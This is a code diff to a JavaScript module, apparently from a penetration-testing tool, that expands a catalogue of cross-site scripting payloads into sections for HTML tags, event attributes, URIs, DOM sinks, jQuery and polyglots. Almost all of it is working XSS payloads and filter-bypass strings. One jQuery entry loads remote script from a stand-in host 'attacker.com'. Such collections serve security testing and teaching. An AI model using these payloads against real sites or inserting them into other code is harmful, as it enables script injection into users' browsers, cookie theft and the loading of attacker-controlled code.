@@ -2,16 +2,87 @@ export const payloadCategories = [
   {
     id: "xss",
     name: "XSS",
-    payloads: [
-      { name: "Basic", code: "<script>alert(1)</script>" },
-      { name: "Img Onerror", code: "<img src=x onerror=alert(1)>" },
-      { name: "Svg Onload", code: "<svg/onload=alert(1)>" },
-      { name: "Iframe JS", code: "<iframe src=javascript:alert(1)>" },
-      { name: "Event Handler", code: "\" autofocus onfocus=alert(1)>" },
-      { name: "HTML Injection", code: "<h1>Hacked</h1>" },
-      { name: "Filter Bypass", code: "<scr<script>ipt>alert(1)</scr</script>ipt>" },
-      { name: "XSS Polyglot", code: "\"><svg/onload=alert(1)>" }
-    ]
+    sections: [
+      {
+        title: "HTML Tags",
+        payloads: [
+          { name: "Script Tag", code: "<script>alert(1)</script>" },
+          { name: "Body Onload", code: "<body onload=alert(1)>" },
+          { name: "Img Error", code: "<img src=x onerror=alert(1)>" },
+          { name: "Iframe JS", code: "<iframe src=javascript:alert(1)>" },
+          { name: "Input Autofocus", code: "<input onfocus=alert(1) autofocus>" },
+          { name: "Details Toggle", code: "<details ontoggle=alert(1)>" },
+          { name: "Svg Onload", code: "<svg/onload=alert(1)>" },
+          { name: "Marquee Loop", code: "<marquee onstart=finish()>" },
+          { name: "Object Data", code: "<object data=javascript:alert(1)>" },
+          { name: "Audio Error", code: "<audio src=x onerror=alert(1)>" },
+          { name: "Video Error", code: "<video src=x onerror=alert(1)>" }
+        ]
+      },
+      {
+        title: "Attributes",
+        payloads: [
+          { name: "Onload", code: "onload=alert(1)" },
+          { name: "Onerror", code: "onerror=alert(1)" },
+          { name: "Onmouseover", code: "onmouseover=alert(1)" },
+          { name: "Onfocus", code: "onfocus=alert(1)" },
+          { name: "Oninput", code: "oninput=alert(1)" },
+          { name: "Onchange", code: "onchange=alert(1)" },
+          { name: "Onanimationstart", code: "onanimationstart=alert(1)" },
+          { name: "Onwheel", code: "onwheel=alert(1)" },
+          { name: "Oncopy", code: "oncopy=alert(1)" },
+          { name: "Onpaste", code: "onpaste=alert(1)" }
+        ]
+      },
+      {
+        title: "JavaScript / URIs",
+        payloads: [
+          { name: "Javascript URI", code: "javascript:alert(1)" },
+          { name: "VBscript URI", code: "vbscript:msgbox(\"XSS\")" },
+          { name: "Data URI", code: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },
+          { name: "Unicode Escape", code: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e" },
+          { name: "Hex Encoding", code: "%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
+          { name: "Eval Code", code: "eval('alert(1)')" },
+          { name: "SetTimeout", code: "setTimeout('alert(1)',0)" }
+        ]
+      },
+      {
+        title: "DOM Based",
+        payloads: [
+          { name: "Document Write", code: "document.write('<img src=x onerror=alert(1)>')" },
+          { name: "Document Cookie", code: "document.cookie='user=<script>alert(1)</script>'" },
+          { name: "Window Location", code: "window.location='javascript:alert(1)'" },
+          { name: "Inner HTML", code: "element.innerHTML='<img src=x onerror=alert(1)>'" },
+          { name: "Location Hash", code: "eval(location.hash.slice(1))" },
+          { name: "Window Name", code: "eval(window.name)" },
+          { name: "Local Storage", code: "localStorage.setItem('xss', '<img src=x onerror=alert(1)>')" }
+        ]
+      },
+      {
+        title: "jQuery",
+        payloads: [
+          { name: "Append", code: "$('body').append('<script>alert(1)</script>')" },
+          { name: "Prepend", code: "$('body').prepend('<script>alert(1)</script>')" },
+          { name: "Wrap", code: "$('img').wrap('<div onerror=alert(1)></div>')" },
+          { name: "GetScript", code: "$.getScript('http://attacker.com/xss.js')" },
+          { name: "Selector Injection", code: "$('<img src=x onerror=alert(1)>')" },
+          { name: "Old jQuery (CVE)", code: "$('#<img src=x onerror=alert(1)>')" }
+        ]
+      },
+      {
+        title: "Polyglots & Other",
+        payloads: [
+          { name: "Space Polyglot", code: "javascript://%250Aalert(1)//" },
+          { name: "Comment Opener", code: "<!--<script>alert(1)-->" },
+          { name: "Ah, the Classic", code: "\"><script>alert(1)</script>" },
+          { name: "Ultimate Polyglot 1", code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e" },
+          { name: "Ultimate Polyglot 2", code: "\">><marquee><img src=x onerror=confirm(1)></marquee>\"</textarea>’>”></iframe><script>alert(1)</script>" },
+          { name: "Locator 1", code: "\";alert(1)//" },
+          { name: "Filter Bypass 1", code: "<scr<script>ipt>alert(1)</scr</script>ipt>" }
+        ]
+      }
+    ],
+    payloads: [] 
   },
 
   {
